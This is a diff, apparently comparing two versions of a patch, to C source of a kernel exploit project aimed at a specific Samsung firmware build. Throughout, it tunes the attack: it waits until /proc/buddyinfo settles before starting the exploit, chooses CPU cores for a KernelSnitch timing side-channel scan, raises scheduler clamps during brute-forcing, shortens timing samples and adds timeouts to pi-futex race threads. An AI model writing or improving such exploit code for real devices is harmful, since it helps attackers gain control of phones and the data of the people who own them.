@@ -1,19 +1,8 @@
-diff --git a/src/targets/dm1q-S911BXXSAFZG1/target.h b/src/targets/dm1q-S911BXXSAFZG1/target.h
---- a/src/targets/dm1q-S911BXXSAFZG1/target.h
-+++ b/src/targets/dm1q-S911BXXSAFZG1/target.h
-@@ -18,6 +18,7 @@
- #define PSELECT_ENTER_DELAY_USEC 50000
- 
- #if defined(APP_PAYLOAD) && APP_PAYLOAD
-+#define APP_SAFE_SPEED_BACKPORT 1
- #define SLIDE_MCAST_DOMAIN AF_INET6
- #define SLIDE_MCAST_LEVEL IPPROTO_IPV6
- #define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
 diff --git a/src/common.h b/src/common.h
+index 0521560..50d8db6 100644
 --- a/src/common.h
 +++ b/src/common.h
 @@ -72,7 +72,11 @@
- #ifndef KERNELSNITCH_MTE_ENABLED
  #define KERNELSNITCH_MTE_ENABLED 0
  #endif
  #define MM_PARTIALS 5
@@ -26,18 +15,70 @@ diff --git a/src/common.h b/src/common.h
  #ifndef KSNITCH_COLLISIONS
  #define KSNITCH_COLLISIONS 4
  #endif
+diff --git a/src/kernelsnitch/kernelsnitch.h b/src/kernelsnitch/kernelsnitch.h
+index 9ad4cd0..4cdf998 100644
+--- a/src/kernelsnitch/kernelsnitch.h
++++ b/src/kernelsnitch/kernelsnitch.h
+@@ -334,7 +334,11 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
+         ks->thread_cnt,
+         ks->collisions,
+         ks->mte_enabled ? "enabled" : "disabled");
++#if defined(APP_SAFE_SPEED_BACKPORT) && APP_SAFE_SPEED_BACKPORT
++    pin_to_core(rmg_resolve_scan_core());
++#else
+     pin_to_core(0);
++#endif
+     futex_init();
+ 
+     ks->state = KERNELSNITCH_INIT;
+@@ -467,6 +471,34 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
+     if (ks->verbose) pr_info("start bruteforcing\n");
+     reset_cpu_pin();
+ 
++#if defined(APP_SAFE_SPEED_BACKPORT) && APP_SAFE_SPEED_BACKPORT
++    /* Timing-insensitive post-scan boost. Spawned workers inherit the clamp.
++     * RMG_UCLAMP=0 disables it immediately for A/B or recovery testing. */
++    if (!(getenv("RMG_UCLAMP") && getenv("RMG_UCLAMP")[0] == '0')) {
++        struct {
++            unsigned int size;
++            unsigned int sched_policy;
++            unsigned long long sched_flags;
++            int sched_nice;
++            unsigned int sched_priority;
++            unsigned long long sched_runtime;
++            unsigned long long sched_deadline;
++            unsigned long long sched_period;
++            unsigned int sched_util_min;
++            unsigned int sched_util_max;
++        } attr;
++        memset(&attr, 0, sizeof(attr));
++        attr.size = (unsigned int)sizeof(attr);
++        attr.sched_policy = 0; /* SCHED_NORMAL */
++        attr.sched_flags = 0x20; /* SCHED_FLAG_UTIL_CLAMP_MIN */
++        attr.sched_util_min = 512;
++        attr.sched_util_max = 1024;
++        if (syscall(274 /* __NR_sched_setattr */, 0, &attr, 0) == 0) {
++            pr_info("ksnitch bruteforce uclamp_min=512\n");
++        }
++    }
++#endif
++
+     for (size_t i = 0; i < ks->thread_cnt; ++i) {
+         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
+         mm_leak_arg->ks = ks;
 diff --git a/src/preload.c b/src/preload.c
+index 947d57d..f8402fb 100644
 --- a/src/preload.c
 +++ b/src/preload.c
-@@ -93,17 +93,77 @@ static int attempt_delay_usec(int base_delay, int attempt) {
+@@ -102,17 +102,91 @@ static int attempt_delay_usec(int base_delay, int attempt) {
    return delay < 0 ? 0 : delay;
  }
  
 +#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
 +    defined(APP_SAFE_SPEED_BACKPORT) && APP_SAFE_SPEED_BACKPORT
-+/* Order-3+ free pages across all zones. Once the high-order buddy counts
-+ * stop changing, the boot allocation storm has settled enough to start the
-+ * exploit without blindly waiting for the old fixed 120-second mark. */
++/* Order-3+ free pages across all zones. Once these counts stop changing,
++ * the boot allocator storm has settled enough to start without blindly
++ * sleeping all the way to 120 seconds. */
 +static long long buddy_high_order_free(void) {
 +  FILE *f = fopen("/proc/buddyinfo", "r");
 +  if (!f) {
@@ -83,7 +124,6 @@ diff --git a/src/preload.c b/src/preload.c
 -            (long long)wait_sec, (long long)uptime.tv_sec);
 -    while (wait_sec > 0) {
 -      wait_sec = sleep((unsigned int)wait_sec);
--    }
 +  if (uptime.tv_sec >= APP_MIN_BOOT_UPTIME_SEC) {
 +    return;
 +  }
@@ -92,9 +132,9 @@ diff --git a/src/preload.c b/src/preload.c
 +          (long long)wait_sec, (long long)uptime.tv_sec);
 +
 +#if defined(APP_SAFE_SPEED_BACKPORT) && APP_SAFE_SPEED_BACKPORT
-+  /* Final v1.2.0 policy: a hard 60-second floor, exact equality for three
-+   * consecutive 2-second samples, and the original 120-second hard cap.
-+   * Do not use the reverted drift-tolerance variant that started too early. */
++  /* Final v1.2.0 policy: 60-second floor, three EXACT identical samples
++   * two seconds apart, and the original 120-second hard cap. Intentionally
++   * excludes the reverted drift-tolerance experiment that panicked early. */
 +  static const time_t QUIET_FLOOR_SEC = 60;
 +  static const int QUIET_STABLE_SAMPLES = 3;
 +  long long prev = -1;
@@ -104,7 +144,7 @@ diff --git a/src/preload.c b/src/preload.c
 +    SYSCHK(clock_gettime(CLOCK_BOOTTIME, &now_ts));
 +    if (now_ts.tv_sec >= APP_MIN_BOOT_UPTIME_SEC) {
 +      return;
-+    }
+     }
 +    if (now_ts.tv_sec >= QUIET_FLOOR_SEC && stable >= QUIET_STABLE_SAMPLES) {
 +      pr_info("boot allocator quiet (buddy stable) uptime=%lld\n",
 +              (long long)now_ts.tv_sec);
@@ -128,17 +168,70 @@ diff --git a/src/preload.c b/src/preload.c
    }
  #endif
  }
+diff --git a/src/slide_app.c b/src/slide_app.c
+index 06ddeca..d792bbf 100644
+--- a/src/slide_app.c
++++ b/src/slide_app.c
+@@ -1828,6 +1828,7 @@ static int slide_child_trigger_write(void) {
+   pthread_t waiter;
+   pthread_t owner;
+   pthread_t consumer;
++  int ready_polls = 0;
+   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
+   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
+   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
+@@ -1836,6 +1837,10 @@ static int slide_child_trigger_write(void) {
+          !atomic_load(&slide_owner_started) ||
+          !atomic_load(&slide_consumer_ready)) {
+     usleep(1000);
++    if (++ready_polls > 10000) {
++      pr_error("slide pi ready-sync timed out\n");
++      return 0;
++    }
+   }
+   if (SLIDE_REQUEUE_ARM_USEC) {
+     usleep(SLIDE_REQUEUE_ARM_USEC);
+@@ -1866,8 +1871,15 @@ static int slide_child_trigger_write(void) {
+   }
+   pr_info("slide pi stage=deadlock-accepted\n");
+   atomic_store(&slide_deadlock_seen, 1);
+-  while (!atomic_load(&slide_route_done)) {
+-    usleep(1000);
++  {
++    long route_wait_ms = 0;
++    while (!atomic_load(&slide_route_done)) {
++      usleep(1000);
++      if (++route_wait_ms > 20000) {
++        pr_error("slide pi route wait timed out after 20s\n");
++        return 0;
++      }
++    }
+   }
+ #if defined(APP_ACCEPT_SCHED_TRIGGER) && APP_ACCEPT_SCHED_TRIGGER
+   int sched_ok = atomic_load(&slide_consume_sched_ok) != 0;
+diff --git a/src/targets/dm1q-S911BXXSAFZG1/target.h b/src/targets/dm1q-S911BXXSAFZG1/target.h
+index ef2e360..f0d6684 100644
+--- a/src/targets/dm1q-S911BXXSAFZG1/target.h
++++ b/src/targets/dm1q-S911BXXSAFZG1/target.h
+@@ -17,6 +17,7 @@
+ #define PSELECT_ENTER_DELAY_USEC 50000
+ 
+ #if defined(APP_PAYLOAD) && APP_PAYLOAD
++#define APP_SAFE_SPEED_BACKPORT 1
+ #define SLIDE_MCAST_DOMAIN AF_INET6
+ #define SLIDE_MCAST_LEVEL IPPROTO_IPV6
+ #define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
 diff --git a/src/util.c b/src/util.c
+index 566f1fd..61a5521 100644
 --- a/src/util.c
 +++ b/src/util.c
-@@ -1,6 +1,50 @@
+@@ -1,6 +1,56 @@
  #include "common.h"
  #include "kernelsnitch/kernelsnitch.h"
  
-+/* Scan-only core selection. Unlike HyperRamzey's Fold-specific dynamic CORE,
-+ * this never changes CORE itself: slide/fops/pi-futex choreography stays on
-+ * the proven LITTLE literal. Set RMG_SCAN_PERF=1 to let KernelSnitch use the
-+ * highest currently permitted CPU; default is the proven LITTLE core. */
++/* Runtime CPU choice is scan-only. CORE itself stays the proven LITTLE
++ * literal, so slide/fops/pi-futex write choreography is unchanged. Perf-core
++ * scanning is opt-in until it is validated on dm1q hardware: RMG_SCAN_PERF=1. */
 +int rmg_resolve_scan_core(void) {
 +#if defined(APP_SAFE_SPEED_BACKPORT) && APP_SAFE_SPEED_BACKPORT
 +  const char *enable = getenv("RMG_SCAN_PERF");
@@ -150,8 +243,8 @@ diff --git a/src/util.c b/src/util.c
 +    return RMG_CORE_LITERAL;
 +  }
 +  long online = sysconf(_SC_NPROCESSORS_ONLN);
-+  if (online > AFFINITY_MAX_CPUS) {
-+    online = AFFINITY_MAX_CPUS;
++  if (online > CPU_SETSIZE) {
++    online = CPU_SETSIZE;
 +  }
 +  for (int c = (int)online - 1; c >= 0; --c) {
 +    if (!CPU_ISSET(c, &current)) {
@@ -189,7 +282,7 @@ diff --git a/src/util.c b/src/util.c
  static struct kernelsnitch_shared_state *ks;
  static size_t mm_objs_per_slab;
  static unsigned char *skb_buf;
-@@ -29,22 +73,6 @@ static int rmg_fast_profile_enabled(void) {
+@@ -29,23 +79,6 @@ static int rmg_fast_profile_enabled(void) {
  #endif
  }
  
@@ -212,7 +305,8 @@ diff --git a/src/util.c b/src/util.c
 -
  static void configure_kernelsnitch_profile(
      struct kernelsnitch_shared_state *state, int payload_mode) {
-@@ -975,7 +1003,23 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
+   size_t appended_futexes = APPENDED_FUTEXES;
+@@ -988,7 +1021,25 @@ static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
      if (!state) {
        return -1;
      }
@@ -220,8 +314,6 @@ diff --git a/src/util.c b/src/util.c
 +    size_t repeat_default = REPEAT_MEASUREMENT;
 +    size_t average_default = AVERAGE;
 +#if defined(APP_SAFE_SPEED_BACKPORT) && APP_SAFE_SPEED_BACKPORT
-+    /* v1.2.0 speed profile. Keep collision count, threshold, pile-up and
-+     * target offsets untouched; only shorten the timing sample profile. */
 +    if (repeat_default > 64) {
 +      repeat_default = 64;
 +    }
@@ -236,98 +328,8 @@ diff --git a/src/util.c b/src/util.c
 +    if (average > repeat) {
 +      average = repeat;
 +    }
++    /* Preserve dm1q's proven controlled-mm pile-up of 256. */
 +    kernelsnitch_set_profile(state, 256, repeat, average);
  #ifdef QEMU_MM_TRACE_VALIDATE
      uintptr_t oracle_mm = 0;
      if (!qemu_mm_trace_drain()) {
-diff --git a/src/kernelsnitch/kernelsnitch.h b/src/kernelsnitch/kernelsnitch.h
---- a/src/kernelsnitch/kernelsnitch.h
-+++ b/src/kernelsnitch/kernelsnitch.h
-@@ -337,7 +337,11 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
-         ks->thread_cnt,
-         ks->collisions,
-         ks->mte_enabled ? "enabled" : "disabled");
--    pin_to_core(0);
-+#if defined(APP_SAFE_SPEED_BACKPORT) && APP_SAFE_SPEED_BACKPORT
-+    pin_to_core(rmg_resolve_scan_core());
-+#else
-+    pin_to_core(0);
-+#endif
-     futex_init();
- 
-     ks->state = KERNELSNITCH_INIT;
-@@ -463,6 +467,37 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
-     if (ks->verbose) pr_info("start bruteforcing\n");
-     reset_cpu_pin();
- 
-+#if defined(APP_SAFE_SPEED_BACKPORT) && APP_SAFE_SPEED_BACKPORT
-+    /* Bias only the timing-insensitive post-scan brute force. Workers inherit
-+     * the clamp. RMG_UCLAMP=0 is the immediate kill switch. */
-+    if (!(getenv("RMG_UCLAMP") && getenv("RMG_UCLAMP")[0] == '0')) {
-+        struct {
-+            unsigned int size;
-+            unsigned int sched_policy;
-+            unsigned long long sched_flags;
-+            int sched_nice;
-+            unsigned int sched_priority;
-+            unsigned long long sched_runtime;
-+            unsigned long long sched_deadline;
-+            unsigned long long sched_period;
-+            unsigned int sched_util_min;
-+            unsigned int sched_util_max;
-+        } attr;
-+        memset(&attr, 0, sizeof(attr));
-+        attr.size = (unsigned int)sizeof(attr);
-+        attr.sched_policy = 0;
-+        attr.sched_flags = 0x20; /* SCHED_FLAG_UTIL_CLAMP_MIN */
-+        attr.sched_util_min = 512;
-+        attr.sched_util_max = 1024;
-+        if (syscall(274 /* __NR_sched_setattr */, 0, &attr, 0) == 0) {
-+            pr_info("ksnitch bruteforce uclamp_min=512\n");
-+        }
-+    }
-+#endif
-+
-     for (size_t i = 0; i < ks->thread_cnt; ++i) {
-         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
-         mm_leak_arg->ks = ks;
-diff --git a/src/slide_app.c b/src/slide_app.c
---- a/src/slide_app.c
-+++ b/src/slide_app.c
-@@ -1828,6 +1828,7 @@ static int slide_child_trigger_write(void) {
-   pthread_t waiter;
-   pthread_t owner;
-   pthread_t consumer;
-+  int ready_polls = 0;
-   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
-   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
-   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
-@@ -1836,6 +1837,11 @@ static int slide_child_trigger_write(void) {
-          !atomic_load(&slide_owner_started) ||
-          !atomic_load(&slide_consumer_ready)) {
-     usleep(1000);
-+    if (++ready_polls > 10000) {
-+      pr_error("slide pi ready-sync timed out\n");
-+      return 0;
-+    }
-   }
-   if (SLIDE_REQUEUE_ARM_USEC) {
-     usleep(SLIDE_REQUEUE_ARM_USEC);
-@@ -1866,8 +1872,16 @@ static int slide_child_trigger_write(void) {
-   }
-   pr_info("slide pi stage=deadlock-accepted\n");
-   atomic_store(&slide_deadlock_seen, 1);
--  while (!atomic_load(&slide_route_done)) {
--    usleep(1000);
-+  {
-+    long route_wait_ms = 0;
-+    while (!atomic_load(&slide_route_done)) {
-+      usleep(1000);
-+      if (++route_wait_ms > 20000) {
-+        pr_error("slide pi route wait timed out after 20s\n");
-+        return 0;
-+      }
-+    }
-   }
- #if defined(APP_ACCEPT_SCHED_TRIGGER) && APP_ACCEPT_SCHED_TRIGGER
-   int sched_ok = atomic_load(&slide_consume_sched_ok) != 0;
